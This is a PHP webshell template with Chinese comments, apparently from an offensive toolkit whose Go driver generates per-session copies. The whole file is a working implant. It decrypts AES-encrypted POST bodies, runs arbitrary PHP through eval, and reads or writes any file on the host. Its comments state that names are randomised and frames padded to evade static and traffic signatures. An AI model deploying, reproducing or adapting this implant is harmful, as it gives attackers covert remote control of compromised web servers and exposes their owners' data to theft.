<?php
/**
 * ARTEX 加密马 (phpenc) —— 自研 implant,配套驱动:session/http_shell_enc.go。
 * 本文件由 generate_webshell 生成:密钥每会话独立随机,函数/变量名每份随机化
 * (静态特征最小化)。保留本文件可读性与注释,是刻意为之:交给用户审计。
 *
 * 协议(自研,与哥斯拉/冰蝎等公开 webshell 平台协议无关,请求/响应同构):
 *   body   = base64( nonce || ciphertext || tag )        —— 裸 POST body,不走表单字段
 *   明文帧 = padLen(1B) || 随机填充(0~64B) || JSON      —— 随机填充杀定长/前缀流量签名
 *   请求 JSON: {"op":"exec|probe|read|write", ...}
 *   响应 JSON: {"ok":bool,"out":...,"err":...,"mode":"gcm|cbc"}
 *   约定:JSON 字段值恒为 base64/hex/枚举(无引号反斜杠),允许对端无 JSON 库时朴素解析。
 *
 * 加密(运行时按目标能力二选一,两路径均在本文件内,无外部依赖):
 *   - 优先 AES-256-GCM:nonce 12B,tag 16B(PHP 7.1+ 的 openssl 支持);
 *   - 降级 AES-256-CBC + HMAC-SHA256(encrypt-then-MAC):iv 16B,mac 32B,
 *     先验 MAC 再解密;子密钥由主密钥加域分隔串派生 sha256(key || 域)。
 * 模式标识写死于生成时(见下),运行时按 openssl_get_cipher_methods() 复核。
 */
${{.VKey}} = base64_decode('{{.KeyB64}}');
{{.VMethods}} = openssl_get_cipher_methods();
{{.VMode}} = in_array('aes-256-gcm', {{.VMethods}}, true) ? 'gcm' : 'cbc';

// 解密一帧:输入 base64 密文,输出明文帧;任何认证/格式失败返回 false,
// 调用方不回显任何明文或错误细节,只回一个加密的错误帧。
function {{.FDec}}($k, $m, $b64) {
    $raw = base64_decode($b64, true);
    if ($raw === false || strlen($raw) < 12 + 16 + 1) { return false; }
    if ($m === 'gcm') {
        $iv  = substr($raw, 0, 12);
        $tag = substr($raw, -16);
        $ct  = substr($raw, 12, -16);
        $pt  = openssl_decrypt($ct, 'aes-256-gcm', $k, OPENSSL_RAW_DATA, $iv, $tag);
        return $pt === false ? false : $pt;
    }
    if (strlen($raw) < 16 + 32 + 1) { return false; }
    $iv  = substr($raw, 0, 16);
    $mac = substr($raw, -32);
    $ct  = substr($raw, 16, -32);
    $km  = hash('sha256', $k . 'artex-mac-v1', true);
    if (!hash_equals($mac, hash_hmac('sha256', $iv . $ct, $km, true))) { return false; }
    $ke = hash('sha256', $k . 'artex-enc-v1', true);
    $pt = openssl_decrypt($ct, 'aes-256-cbc', $ke, OPENSSL_RAW_DATA, $iv);
    return $pt === false ? false : $pt;
}

// 加密一帧:与 {{.FDec}} 镜像。nonce/iv 每帧 random_bytes。
function {{.FEnc}}($k, $m, $pt) {
    if ($m === 'gcm') {
        $iv  = random_bytes(12);
        $tag = '';
        $ct  = openssl_encrypt($pt, 'aes-256-gcm', $k, OPENSSL_RAW_DATA, $iv, $tag);
        return base64_encode($iv . $ct . $tag);
    }
    $iv  = random_bytes(16);
    $ke  = hash('sha256', $k . 'artex-enc-v1', true);
    $ct  = openssl_encrypt($pt, 'aes-256-cbc', $ke, OPENSSL_RAW_DATA, $iv);
    $km  = hash('sha256', $k . 'artex-mac-v1', true);
    $mac = hash_hmac('sha256', $iv . $ct, $km, true);
    return base64_encode($iv . $ct . $mac);
}

// 明文帧:长度字节 + 随机填充 + 载荷(随机填充长度每帧独立,杀长度签名)。
function {{.FFrame}}($p) {
    $n = random_int(0, 64);
    return chr($n) . ($n > 0 ? random_bytes($n) : '') . $p;
}
function {{.FUnframe}}($f) {
    if (strlen($f) < 1) { return false; }
    $n = ord($f[0]);
    if (strlen($f) < 1 + $n) { return false; }
    return substr($f, 1 + $n);
}

{{.VResp}} = array('ok' => false, 'out' => '', 'err' => '', 'mode' => {{.VMode}});
{{.VPlain}} = {{.FDec}}(${{.VKey}}, {{.VMode}}, file_get_contents('php://input'));
if ({{.VPlain}} === false) {
    {{.VResp}}['err'] = 'decrypt failed';
} else {
    {{.VJson}} = {{.FUnframe}}({{.VPlain}});
    {{.VReq}} = ({{.VJson}} === false) ? null : json_decode({{.VJson}}, true);
    if (!is_array({{.VReq}})) {
        {{.VResp}}['err'] = 'bad frame';
    } else {
        {{.VOp}} = isset({{.VReq}}['op']) ? {{.VReq}}['op'] : '';
        if ({{.VOp}} === 'probe') {
            // 存活/密钥校验探针:回显对端发来的随机串。
            {{.VResp}}['ok'] = true;
            {{.VResp}}['out'] = isset({{.VReq}}['s']) ? {{.VReq}}['s'] : '';
        } elseif ({{.VOp}} === 'exec') {
            // 主通道:eval 一段 PHP 代码(ob 捕获全部输出)。代码段由驱动侧构造,
            // 与期 1a 一句话马同一执行面(哨兵/函数降级/分块/引号规避都在代码段内)。
            {{.VCode}} = base64_decode(isset({{.VReq}}['code']) ? {{.VReq}}['code'] : '', true);
            ob_start();
            try {
                eval({{.VCode}} === false ? '' : {{.VCode}});
                {{.VResp}}['ok'] = true;
            } catch (Throwable {{.VT}}) {
                {{.VResp}}['err'] = 'eval: ' . {{.VT}}->getMessage();
            }
            {{.VResp}}['out'] = base64_encode(ob_get_clean());
        } elseif ({{.VOp}} === 'read') {
            // 原生整文件读(兜底通道;主通道的分块读由驱动经 exec 构造)。
            {{.VData}} = @file_get_contents(base64_decode(isset({{.VReq}}['path']) ? {{.VReq}}['path'] : ''));
            if ({{.VData}} === false) { {{.VResp}}['err'] = 'read failed'; }
            else { {{.VResp}}['ok'] = true; {{.VResp}}['out'] = base64_encode({{.VData}}); }
        } elseif ({{.VOp}} === 'write') {
            // 原生写(兜底通道;app=1 追加)。主通道的分块写由驱动经 exec 构造。
            {{.VFlag}} = (isset({{.VReq}}['app']) && {{.VReq}}['app'] === '1') ? FILE_APPEND : 0;
            {{.VR}} = @file_put_contents(
                base64_decode(isset({{.VReq}}['path']) ? {{.VReq}}['path'] : ''),
                base64_decode(isset({{.VReq}}['data']) ? {{.VReq}}['data'] : ''),
                {{.VFlag}});
            if ({{.VR}} === false) { {{.VResp}}['err'] = 'write failed'; }
            else { {{.VResp}}['ok'] = true; }
        } else {
            {{.VResp}}['err'] = 'unknown op';
        }
    }
}
echo {{.FEnc}}(${{.VKey}}, {{.VMode}}, {{.FFrame}}(json_encode({{.VResp}})));
